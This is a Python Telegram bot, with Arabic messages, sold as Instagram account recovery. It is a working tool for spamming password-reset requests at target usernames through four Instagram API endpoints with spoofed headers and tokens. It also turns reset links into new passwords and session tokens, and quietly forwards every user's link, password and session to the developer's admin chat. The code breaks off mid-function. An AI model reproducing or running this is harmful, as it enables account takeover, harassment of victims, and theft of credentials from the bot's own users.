from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import requests
import uuid
import random
import string
import json
import re
import asyncio
import urllib.parse
import base64

BOT_TOKEN = "7960787404:AAHr7DDOdtEi33HT0Luv6Gzt4PGk__etGaw"
ADMIN_ID = 7748668201  

# قنوات الاشتراك الإجباري (ضع معرفات القنوات هنا)
REQUIRED_CHANNELS = [
    "@yoseifinstaa",
]

# المجموعات المسموح بها (ضع معرفات المجموعات هنا)
ALLOWED_GROUPS = [
    "@chatyoshelp",
    "@bll2k",
    "@siirwev",
    "@UnitGroup11"
]

# حالة المستخدم
USER_STATES = {}

async def check_subscription(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """التحقق من اشتراك المستخدم في جميع القنوات المطلوبة"""
    try:
        for channel in REQUIRED_CHANNELS:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        print(f"خطأ في التحقق من الاشتراك: {e}")
        return False

async def send_subscription_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إرسال رسالة طلب الاشتراك في القنوات"""
    keyboard_buttons = []
    for channel in REQUIRED_CHANNELS:
        keyboard_buttons.append([InlineKeyboardButton(f"اشتراك في {channel}", url=f"https://t.me/{channel[1:]}")])
    
    keyboard_buttons.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")])
    
    reply_markup = InlineKeyboardMarkup(keyboard_buttons)
    
    message_text = (
        "🔒 اشتراك إجباري مطلوب\n\n"
        "📢 يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:\n\n"
    )
    
    for channel in REQUIRED_CHANNELS:
        message_text += f"• {channel}\n"
    
    message_text += "\n✅ بعد الاشتراك في جميع القنوات، اضغط على زر 'تحقق من الاشتراك'"
    
    if hasattr(update, 'message'):
        await update.message.reply_text(message_text, reply_markup=reply_markup)
    else:
        await update.callback_query.edit_message_text(message_text, reply_markup=reply_markup)

async def is_allowed_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """التحقق مما إذا كانت المجموعة مسموح بها"""
    if not ALLOWED_GROUPS:
        return True
    
    chat_id = update.effective_chat.id
    
    try:
        chat = await context.bot.get_chat(chat_id)
        chat_username = f"@{chat.username}" if chat.username else None
        
        if chat_username and chat_username in ALLOWED_GROUPS:
            return True
        
        if str(chat_id) in ALLOWED_GROUPS:
            return True
            
        return False
        
    except Exception as e:
        print(f"❌ خطأ في التحقق من المجموعة: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.chat.type in ['group', 'supergroup']:
        return
    
    user_id = update.effective_user.id
    
    if not await check_subscription(user_id, context):
        await send_subscription_message(update, context)
        return
    
    USER_STATES[user_id] = {"state": "main"}
    
    keyboard = [
        [InlineKeyboardButton("🔐 إرسال رابط استعادة كلمة المرور", callback_data="send_recovery")],
        [InlineKeyboardButton("🔄 تغيير كلمة المرور من رابط الريست", callback_data="change_password_main")],
        [InlineKeyboardButton("📱 اتصال جديد (إيميل/رقم/واتساب)", callback_data="new_connection")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "👋 مرحباً بك في بوت استعادة حسابات إنستغرام\n\n"
        "اختر الخيار المناسب من القائمة أدناه:\n\n"
        "⚙️ المطور: @Loosbieh",
        reply_markup=reply_markup
    )

async def rest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أمر /rest في المجموعات"""
    chat_id = update.effective_chat.id
    
    if not await is_allowed_group(update, context):
        await update.message.reply_text("❌ هذا البوت غير مفعل في هذه المجموعة.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ يرجى تحديد اسم المستخدم\n📌 الاستخدام: /rest username")
        return
    
    target_user = context.args[0].strip()
    
    processing_msg = await update.message.reply_text(f"🚀 جاري إرسال طلبات الاستعادة...\n\n🎯 المستخدم: {target_user}")
    
    success_count = 0
    failure_count = 0
    results = []
    contact_infos = set()
    
    connections = [
        ("📧 الاتصال الأول", send_reset_primary),
        ("📧 الاتصال الثاني", send_reset_secondary),
        ("📧 الاتصال الثالث", send_reset_third),
        ("📧 الاتصال الرابع", send_reset_fourth)
    ]

    for name, func in connections:
        try:
            result = func(target_user)
            if result is None:
                failure_count += 1
                results.append(f"❌ {name}: فشل - لا توجد نتيجة")
            else:
                success, msg, contact_info = result
                if success:
                    success_count += 1
                    if contact_info:
                        contact_infos.add(contact_info)
                        results.append(f"✅ {name}: ناجح - تم الإرسال إلى: {contact_info}")
                    else:
                        results.append(f"✅ {name}: ناجح")
                else:
                    failure_count += 1
                    results.append(f"❌ {name}: فشل")
        except Exception as e:
            failure_count += 1
            results.append(f"❌ {name}: فشل - خطأ: {str(e)}")
        
        await asyncio.sleep(1)

    result_text = "\n".join(results)
    contact_info_text = ""
    if contact_infos:
        contact_info_text = f"\n\n📧 معلومات الاتصال:\n" + "\n".join([f"• {info}" for info in contact_infos])

    final_message = (
        f"📊 نتيجة الإرسال الجماعي\n\n"
        f"🎯 المستخدم: {target_user}\n\n"
        f"✅ تم الإرسال بنجاح: {success_count}\n"
        f"❌ فشل في الإرسال: {failure_count}"
        f"{contact_info_text}\n\n"
        f"التفاصيل:\n{result_text}\n\n"
        f"⚙️ المطور: @Loosbieh"
    )
    
    await processing_msg.edit_text(final_message)
    
    try:
        chat = await context.bot.get_chat(chat_id)
        chat_name = chat.title or "غير معروف"
        chat_username = f"@{chat.username}" if chat.username else "لا يوجد يوزر"
        
        detailed_report = f"""
📊 تقرير مفصل - إرسال جماعي من مجموعة

🎯 المستخدم: {target_user}
✅ طلبات ناجحة: {success_count}
❌ طلبات فاشلة: {failure_count}

📧 معلومات الاتصال:
{chr(10).join([f'• {info}' for info in contact_infos]) if contact_infos else '• لا توجد معلومات اتصال'}

📋 النتائج التفصيلية:
{chr(10).join(results)}

👥 المجموعة: {chat_name}
🔗 يوزر المجموعة: {chat_username}
🆔 ID المجموعة: {chat_id}
👤 مرسل الطلب: @{update.effective_user.username or 'غير معروف'}
🆔 ID المرسل: {update.effective_user.id}
⏰ الوقت: {update.message.date}

⚙️ المطور: @Loosbieh
        """.strip()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=detailed_report
        )
    except Exception as e:
        print(f"❌ فشل إرسال التقرير للمشرف: {e}")

async def handle_input(update, context):
    if update.message and update.message.chat.type in ['group', 'supergroup']:
        return

    user = update.effective_user
    if not user:
        return

    user_id = user.id

    if not await check_subscription(user_id, context):
        await send_subscription_message(update, context)
        return
    
    user_input = update.message.text.strip()
    user_state = USER_STATES.get(user_id, {}).get("state", "main")
    
    if user_state == "main":
        await update.message.reply_text(
            "❌ عذراً لم أفهم الرسالة 😊\n\n"
            "📝 ارسل /start لأظهار الأوامر\n"
            "👨‍💻 أو راسل مطور البوت: @Loosbieh"
        )
        return
    
    if user_state == "waiting_username":
        USER_STATES[user_id] = {"state": "username_received", "target_user": user_input}
        
        keyboard = [
            [InlineKeyboardButton("🚀 إرسال من جميع الاتصالات", callback_data="send_all")],
            [InlineKeyboardButton("📱 اتصال جديد (إيميل/رقم/واتساب)", callback_data="new_connection")],
            [InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🎯 تم استلام المستخدم: {user_input}\n\n"
            "📨 اختر طريقة إرسال رابط الاستعادة:",
            reply_markup=reply_markup
        )
    
    elif user_state == "waiting_reset_link":
        reset_link = user_input
        
        if not is_valid_reset_link(reset_link):
            keyboard = [
                [InlineKeyboardButton("🔄 المحاولة مرة أخرى", callback_data="change_password_main")],
                [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "❌ رابط الاستعادة غير صالح!\n\n"
                "⚠️ يرجى التأكد من أن الرابط:\n"
                "• من موقع إنستغرام الرسمي\n"
                "• يحتوي على كلمة 'instagram'\n"
                "• رابط استعادة كلمة مرور صالح\n\n"
                "اختر أحد الخيارات أدناه:",
                reply_markup=reply_markup
            )
            return
            
        USER_STATES[user_id] = {
            "state": "waiting_new_password", 
            "reset_link": reset_link
        }
        
        await update.message.reply_text(
            "✅ تم حفظ رابط الاستعادة بنجاح\n\n"
            "🔑 الآن أرسل كلمة المرور الجديدة:\n\n"
            "📝 ملاحظة: يجب أن تكون كلمة المرور قوية وتحتوي على:\n"
            "• أحرف كبيرة وصغيرة\n"
            "• أرقام\n"
            "• رموز خاصة إذا أمكن"
        )
    
    elif user_state == "waiting_new_password":
        new_password = user_input
        reset_link = USER_STATES[user_id].get("reset_link")
        
        if not reset_link:
            await show_main_menu(update, context, "❌ حدث خطأ في البيانات. العودة للقائمة الرئيسية.")
            return
            
        wait_msg = await update.message.reply_text(
            "⏳ جاري تغيير كلمة المرور...\n\n"
            "📊 هذه العملية قد تستغرق بضع ثواني"
        )
        
        success, message, session = change_password(reset_link, new_password)
        
        if success:
            if session and session != "غير متوفر":
                await update.message.reply_text(
                    message,
                    parse_mode='HTML'
                )
                
                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔄 تغيير كلمة مرور ناجح\n\n"
                             f"🔗 الرابط: {reset_link}\n"
                             f"🔑 كلمة المرور الجديدة: {new_password}\n"
                             f"🔐 الجلسة: {session}\n"
                             f"👤 المستخدم: @{update.effective_user.username or 'غير معروف'}\n"
                             f"🆔 ID: {update.effective_user.id}\n\n"
                             f"GOT"
                    )
                except Exception as e:
                    print(f"❌ فشل إرسال التقرير للمشرف: {e}")
                
                USER_STATES[user_id] = {"state": "main"}
                
                keyboard = [
                    [InlineKeyboardButton("🔄 تغيير كلمة مرور أخرى", callback_data="change_password_main")],
                    [InlineKeyboardButton("🔐 إرسال رابط استعادة", callback_data="send_recovery")],
                    [InlineKeyboardButton("📱 اتصال جديد", callback_data="new_connection")],
                    [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    "🎉 تم الانتهاء من العملية\n\n"
                    "اختر الخطوة التالية:",
                    reply_markup=reply_markup
                )
            else:
                USER_STATES[user_id] = {
                    "state": "waiting_username_for_session",
                    "reset_link": reset_link,
                    "new_password": new_password
                }
                
                await update.message.reply_text(
                    f"✅ تم تغيير كلمة المرور بنجاح!\n\n"
                    f"🔑 كلمة المرور الجديدة: {new_password}\n\n"
                    f"❌ لم نتمكن من استخراج الجلسة تلقائياً\n\n"
                    f"👤 الرجاء إرسال اسم المستخدم الحقيقي للحساب:\n"
                    "(اسم المستخدم بدون @)\n\n"
                    f"📝 سأحاول استخراج الجلسة باستخدام اسم المستخدم وكلمة المرور الجديدة"
                )
        else:
            keyboard = [
                [InlineKeyboardButton("🔄 المحاولة مرة أخرى", callback_data="change_password_main")],
                [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"❌ فشل تغيير كلمة المرور\n\n{message}\n\n"
                "اختر أحد الخيارات أدناه:",
                reply_markup=reply_markup
            )
    
    elif user_state == "waiting_username_for_session":
        username = user_input
        reset_link = USER_STATES[user_id].get("reset_link")
        new_password = USER_STATES[user_id].get("new_password")
        
        if not username:
            await update.message.reply_text("❌ لم يتم إرسال اسم المستخدم. الرجاء المحاولة مرة أخرى.")
            return
            
        wait_msg = await update.message.reply_text(
            f"⏳ جاري استخراج الجلسة باستخدام اسم المستخدم...\n\n"
            f"👤 المستخدم: {username}\n"
            f"🔑 كلمة المرور: {new_password}"
        )
        
        session = get_session_with_username(username, new_password)
        
        if session and session != "غير متوفر":
            success_message = f"""✅ تم استخراج الجلسة بنجاح!

🔐 الجلسة:
<code>{session}</code>

👤 اسم المستخدم: {username}
🔑 كلمة المرور الجديدة: {new_password}

📝 ملاحظة: يمكنك نسخ الجلسة بالنقر عليها"""
            
            await update.message.reply_text(
                success_message,
                parse_mode='HTML'
            )
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"🔄 تغيير كلمة مرور ناجح (باسم المستخدم)\n\n"
                         f"🔗 الرابط: {reset_link}\n"
                         f"👤 اسم المستخدم: {username}\n"
                         f"🔑 كلمة المرور الجديدة: {new_password}\n"
                         f"🔐 الجلسة: {session}\n"
                         f"👤 طالب الخدمة: @{update.effective_user.username or 'غير معروف'}\n"
                         f"🆔 ID: {update.effective_user.id}\n\n"
                         f"GOT"
                )
            except Exception as e:
                print(f"❌ فشل إرسال التقرير للمشرف: {e}")
        else:
            await update.message.reply_text(
                f"❌ لم نتمكن من استخراج الجلسة\n\n"
                f"👤 اسم المستخدم: {username}\n"
                f"🔑 كلمة المرور: {new_password}\n\n"
                f"⚠️ السبب المحتمل:\n"
                f"• اسم المستخدم غير صحيح\n"
                f"• الحساب محظور أو معطل\n"
                f"• مشكلة في الاتصال\n\n"
                f"✅ لكن كلمة المرور تم تغييرها بنجاح!\n"
                f"يمكنك تسجيل الدخول يدوياً باستخدام:\n"
                f"👤 المستخدم: {username}\n"
                f"🔑 كلمة المرور: {new_password}"
            )
        
        USER_STATES[user_id] = {"state": "main"}
        
        keyboard = [
            [InlineKeyboardButton("🔄 تغيير كلمة مرور أخرى", callback_data="change_password_main")],
            [InlineKeyboardButton("🔐 إرسال رابط استعادة", callback_data="send_recovery")],
            [InlineKeyboardButton("📱 اتصال جديد", callback_data="new_connection")],
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎉 تم الانتهاء من العملية\n\n"
            "اختر الخطوة التالية:",
            reply_markup=reply_markup
        )
    
    elif user_state == "waiting_new_connection_username":
        username = user_input
        USER_STATES[user_id] = {"state": "new_connection_username_received", "target_user": username}
        
        processing_msg = await update.message.reply_text(f"🔍 جاري التحقق من الحساب...\n\n👤 المستخدم: {username}")
        
        result = send_new_connection(username)
        
        if result["success"]:
            if result["can_email"] and result["can_sms"] and result["can_whatsapp"]:
                keyboard = [
                    [InlineKeyboardButton("📧 إرسال إلى الإيميل", callback_data="send_email")],
                    [InlineKeyboardButton("📱 إرسال إلى الرقم", callback_data="send_phone")],
                    [InlineKeyboardButton("💚 إرسال عبر واتساب", callback_data="send_whatsapp")],
                    [InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="main_menu")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await processing_msg.edit_text(
                    f"✅ تم العثور على الحساب: {username}\n\n"
                    "📨 اختر طريقة الإرسال:",
                    reply_markup=reply_markup
                )
            elif result["can_email"] and result["can_sms"]:
                keyboard = [
                    [InlineKeyboardButton("📧 إرسال إلى الإيميل", callback_data="send_email")],
                    [InlineKeyboardButton("📱 إرسال إلى الرقم", callback_data="send_phone")],
                    [InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="main_menu")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await processing_msg.edit_text(
                    f"✅ تم العثور على الحساب: {username}\n\n"
                    "📨 اختر طريقة الإرسال:",
                    reply_markup=reply_markup
                )
            elif result["can_email"]:
                email_result = send_new_connection_email(username)
                if email_result["success"]:
                    await processing_msg.edit_text(
                        f"✅ تم إرسال رابط الاستعادة إلى الإيميل\n\n"
                        f"📧 الإيميل: {email_result['contact_info']}\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"⚙️ المطور: @Loosbieh"
                    )
                else:
                    await processing_msg.edit_text(
                        f"❌ فشل في إرسال رابط الاستعادة\n\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"📝 الخطأ: {email_result['message']}"
                    )
            elif result["can_sms"]:
                phone_result = send_new_connection_phone(username)
                if phone_result["success"]:
                    await processing_msg.edit_text(
                        f"✅ تم إرسال رابط الاستعادة إلى الرقم\n\n"
                        f"📱 الرقم: {phone_result['contact_info']}\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"⚙️ المطور: @Loosbieh"
                    )
                else:
                    await processing_msg.edit_text(
                        f"❌ فشل في إرسال رابط الاستعادة\n\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"📝 الخطأ: {phone_result['message']}"
                    )
            elif result["can_whatsapp"]:
                whatsapp_result = send_new_connection_whatsapp(username)
                if whatsapp_result["success"]:
                    await processing_msg.edit_text(
                        f"✅ تم إرسال رابط الاستعادة عبر واتساب\n\n"
                        f"💚 واتساب: {whatsapp_result['contact_info']}\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"⚙️ المطور: @Loosbieh"
                    )
                else:
                    await processing_msg.edit_text(
                        f"❌ فشل في إرسال رابط الاستعادة\n\n"
                        f"👤 المستخدم: {username}\n\n"
                        f"📝 الخطأ: {whatsapp_result['message']}"
                    )
            else:
                await processing_msg.edit_text(
                    f"❌ لا يمكن إرسال رابط استعادة لهذا الحساب\n\n"
                    f"👤 المستخدم: {username}\n\n"
                    f"⚠️ السبب: الحساب لا يدعم استعادة كلمة المرور عبر الإيميل أو الرسائل النصية أو واتساب"
                )
        else:
            await processing_msg.edit_text(
                f"❌ لم يتم العثور على الحساب\n\n"
                f"👤 المستخدم: {username}\n\n"
                f"📝 الخطأ: {result['message']}"
            )
    
    else:
        await update.message.reply_text(
            "❌ عذراً لم أفهم الرسالة 😊\n\n"
            "📝 ارسل /start لأظهار الأوامر\n"
            "👨‍💻 أو راسل مطور البوت: @Loosbieh"
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data

    if data != "check_subscription" and not await check_subscription(user_id, context):
        await send_subscription_message(update, context)
        return

    if data == "check_subscription":
        if await check_subscription(user_id, context):
            await start(update, context)
        else:
            await query.answer("❌ لم تشترك في جميع القنوات المطلوبة بعد!", show_alert=True)
        return

    if data == "main_menu":
        await show_main_menu(update, context)
        USER_STATES[user_id] = {"state": "main"}
        return

    elif data == "send_recovery":
        USER_STATES[user_id] = {"state": "waiting_username"}
        await query.edit_message_text(
            "👤 أرسل اسم المستخدم أو الإيميل\n\n"
            "📝 يمكنك إرسال:\n"
            "• اسم المستخدم (بدون @)\n"
            "• عنوان الإيميل\n"
            "• رقم الهاتف\n\n"
            "⚙️ المطور: @Loosbieh"
        )
        return

    elif data == "change_password_main":
        USER_STATES[user_id] = {"state": "waiting_reset_link"}
        await query.edit_message_text(
            "🔗 أرسل رابط استعادة كلمة المرور\n\n"
            "📌 مثال على الرابط الصحيح:\n"
            "https://www.instagram.com/accounts/password/reset/...\n\n"
            "⚠️ ملاحظات مهمة:\n"
            "• يجب أن يكون الرابط من إنستغرام الرسمي\n"
            "• يجب أن يكون رابط استعادة كلمة مرور\n"
            "• تأكد من صحة الرابط قبل الإرسال\n\n"
            "⚙️ المطور: @Loosbieh"
        )
        return

    elif data == "new_connection":
        USER_STATES[user_id] = {"state": "waiting_new_connection_username"}
        await query.edit_message_text(
            "👤 أرسل اسم المستخدم أو الإيميل\n\n"
            "📝 يمكنك إرسال:\n"
            "• اسم المستخدم (بدون @)\n"
            "• عنوان الإيميل\n"
            "• رقم الهاتف\n\n"
            "⚙️ المطور: @Loosbieh"
        )
        return

    user_data = USER_STATES.get(user_id, {})
    target_user = user_data.get("target_user")
    
    if not target_user:
        await query.edit_message_text("❌ لم يتم تحديد مستخدم. العودة للقائمة الرئيسية.")
        await show_main_menu(update, context)
        return

    if data == "send_all":
        await process_send_all(update, context, target_user)

    elif data == "send_email":
        await query.edit_message_text(f"⏳ جاري الإرسال عبر الإيميل...\n\n🎯 المستخدم: {target_user}")
        result = send_new_connection_email(target_user)
        if result["success"]:
            await show_result_with_options(update, context, f"✅ تم إرسال رابط الاستعادة إلى: {result['contact_info']}", target_user)
        else:
            await show_result_with_options(update, context, f"❌ فشل في الإرسال: {result['message']}", target_user)

    elif data == "send_phone":
        await query.edit_message_text(f"⏳ جاري الإرسال عبر الرقم...\n\n🎯 المستخدم: {target_user}")
        result = send_new_connection_phone(target_user)
        if result["success"]:
            await show_result_with_options(update, context, f"✅ تم إرسال رابط الاستعادة إلى: {result['contact_info']}", target_user)
        else:
            await show_result_with_options(update, context, f"❌ فشل في الإرسال: {result['message']}", target_user)

    elif data == "send_whatsapp":
        await query.edit_message_text(f"⏳ جاري الإرسال عبر واتساب...\n\n🎯 المستخدم: {target_user}")
        result = send_new_connection_whatsapp(target_user)
        if result["success"]:
            await show_result_with_options(update, context, f"✅ تم إرسال رابط الاستعادة عبر: {result['contact_info']}", target_user)
        else:
            await show_result_with_options(update, context, f"❌ فشل في الإرسال: {result['message']}", target_user)

def is_valid_reset_link(link):
    if not link:
        return False
    
    patterns = [
        r'https?://(www\.)?instagram\.com/accounts/password/reset/',
        r'https?://(www\.)?instagram\.com/account_recovery/',
        r'https?://i\.instagram\.com/.*password.*reset',
        r'https?://.*instagram.*reset'
    ]
    
    for pattern in patterns:
        if re.search(pattern, link, re.IGNORECASE):
            return True
    
    return False

async def show_main_menu(update, context, message=None):
    keyboard = [
        [InlineKeyboardButton("🔐 إرسال رابط استعادة كلمة المرور", callback_data="send_recovery")],
        [InlineKeyboardButton("🔄 تغيير كلمة المرور من رابط الريست", callback_data="change_password_main")],
        [InlineKeyboardButton("📱 اتصال جديد (إيميل/رقم/واتساب)", callback_data="new_connection")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = "🏠 القائمة الرئيسية\n\nاختر الخيار المناسب:"
    if message:
        text = f"{message}\n\n{text}"
    
    if hasattr(update, 'callback_query'):
        await update.callback_query.edit_message_text(
            text,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text,
            reply_markup=reply_markup
        )

async def show_result_with_options(update, context, message, target_user):
    keyboard = [
        [InlineKeyboardButton("🔄 تغيير كلمة المرور من رابط الريست", callback_data="change_password_main")],
        [InlineKeyboardButton("🔐 إرسال ريست ل مستخدم آخر", callback_data="send_recovery")],
        [InlineKeyboardButton("📱 اتصال جديد", callback_data="new_connection")],
        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        f"📊 نتيجة العملية\n\n{message}\n\n"
        f"🎯 المستخدم: {target_user}\n\n"
        "⚙️ المطور: @Loosbieh\n\n"
        "اختر الخطوة التالية:",
        reply_markup=reply_markup
    )

async def process_send_all(update, context, target_user):
    query = update.callback_query
    await query.edit_message_text(f"🚀 جاري الإرسال من جميع الاتصالات...\n\n🎯 المستخدم: {target_user}")

    admin_message = await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📨 محاولة استعادة جماعية\n\n🎯 المستخدم: {target_user}\n\n📊 الحالة: جاري البدء..."
    )

    success_count = 0
    failure_count = 0
    results = []
    contact_infos = set()
    
    connections = [
        ("📧 الاتصال الأول", send_reset_primary),
        ("📧 الاتصال الثاني", send_reset_secondary),
        ("📧 الاتصال الثالث", send_reset_third),
        ("📧 الاتصال الرابع", send_reset_fourth)
    ]

    for name, func in connections:
        try:
            result = func(target_user)
            if result is None:
                failure_count += 1
                results.append(f"❌ {name}: فشل - لا توجد نتيجة")
            else:
                success, msg, contact_info = result
                if success:
                    success_count += 1
                    if contact_info:
                        contact_infos.add(contact_info)
                        results.append(f"✅ {name}: ناجح - تم الإرسال إلى: {contact_info}")
                    else:
                        results.append(f"✅ {name}: ناجح")
                else:
                    failure_count += 1
                    results.append(f"❌ {name}: فشل")
        except Exception as e:
            failure_count += 1
            results.append(f"❌ {name}: فشل - خطأ: {str(e)}")

        try:
            await context.bot.edit_message_text(
                chat_id=ADMIN_ID,
                message_id=admin_message.message_id,
                text=f"📨 محاولة استعادة جماعية\n\n"
                     f"🎯 المستخدم: {target_user}\n\n"
                     f"✅ تم الإرسال: {success_count}\n"
                     f"❌ فشل الإرسال: {failure_count}\n"
                     f"📊 الحالة: جاري العمل..."
            )
        except:
            pass

        await asyncio.sleep(1)

    result_text = "\n".join(results)
    contact_info_text = ""
    if contact_infos:
        contact_info_text = f"\n\n📧 معلومات الاتصال:\n" + "\n".join([f"• {info}" for info in contact_infos])

    keyboard = [
        [InlineKeyboardButton("🔄 تغيير كلمة المرور من رابط الريست", callback_data="change_password_main")],
        [InlineKeyboardButton("🔐 إرسال ريست ل مستخدم آخر", callback_data="send_recovery")],
        [InlineKeyboardButton("📱 اتصال جديد", callback_data="new_connection")],
        [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"📊 نتيجة الإرسال الجماعي\n\n"
        f"🎯 المستخدم: {target_user}\n\n"
        f"✅ تم الإرسال بنجاح: {success_count}\n"
        f"❌ فشل في الإرسال: {failure_count}"
        f"{contact_info_text}\n\n"
        f"التفاصيل:\n{result_text}\n\n"
        f"⚙️ المطور: @Loosbieh\n\n"
        f"اختر الخطوة التالية:",
        reply_markup=reply_markup
    )

    detailed_report = f"""
📊 تقرير مفصل - إرسال جماعي

🎯 المستخدم: {target_user}
✅ طلبات ناجحة: {success_count}
❌ طلبات فاشلة: {failure_count}

📧 معلومات الاتصال:
{chr(10).join([f'• {info}' for info in contact_infos]) if contact_infos else '• لا توجد معلومات اتصال'}

📋 النتائج التفصيلية:
{chr(10).join(results)}

👤 مرسل الطلب: @{query.from_user.username or 'غير معروف'}
🆔 ID المرسل: {query.from_user.id}
⏰ الوقت: {query.message.date}

⚙️ المطور: @Loosbieh
    """.strip()

    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=detailed_report
        )
    except Exception as e:
        print(f"❌ فشل إرسال التقرير للمشرف: {e}")

# دوال الإرسال الأساسية
def send_reset_primary(user):
    try:
        url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
        data = {
            "_csrftoken": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
            "username": user,
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4())
        }
        headers = {
            "user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; "
                          f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}/"
                          f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; en_GB;)"
        }

        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.ok and ('"obfuscated_email"' in response.text or 'email' in response.text.lower() or 'phone' in response.text.lower()):
            contact_info = extract_contact_info(response.text)
            if contact_info:
                return True, f"✅ الاتصال الأول: تم إرسال رابط الاستعادة إلى: {contact_info}", contact_info
            else:
                return True, "✅ الاتصال الأول: تم إرسال رابط الاستعادة.", None
        else:
            return False, "❌ الاتصال الأول: لم يتم إرسال ريست.", None
    except Exception as e:
        return False, f"❌ الاتصال الأول: خطأ في الإرسال - {str(e)}", None

def send_reset_secondary(user):
    try:
        url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip,deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
            "x-csrftoken": "j4u26vxxC6D7eE63HhBde0ahZeN4mVfK",
            "x-ig-app-id": "936619743392459"
        }
        data = {"email_or_username": user, "recaptcha_challenge_field": ""}
        
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200:
            contact_info = extract_contact_info(response.text)
            if contact_info:
                return True, f"✅ الاتصال الثاني: تم إرسال رابط الاستعادة إلى: {contact_info}", contact_info
            else:
                return True, "✅ الاتصال الثاني: تم إرسال رابط الاستعادة.", None
        else:
            return False, "❌ الاتصال الثاني: لم يتم إرسال ريست.", None
    except Exception as e:
        return False, f"❌ الاتصال الثاني: خطأ في الإرسال - {str(e)}", None

def send_reset_third(user):
    try:
        url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
        headers = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }
        data = {
            "adid": str(uuid.uuid4()),
            "query": user,
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "waterfall_id": str(uuid.uuid4())
        }

        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200 and ("email" in response.text or "obfuscated_email" in response.text or "phone" in response.text):
            contact_info = extract_contact_info(response.text)
            if contact_info:
                return True, f"✅ الاتصال الثالث: تم إرسال رابط الاستعادة إلى: {contact_info}", contact_info
            else:
                return True, "✅ الاتصال الثالث: تم إرسال رابط الاستعادة.", None
        else:
            return False, "❌ الاتصال الثالث: لم يتم إرسال ريست.", None
    except Exception as e:
        return False, f"❌ الاتصال الثالث: خطأ في الإرسال - {str(e)}", None

def send_reset_fourth(user):
    try:
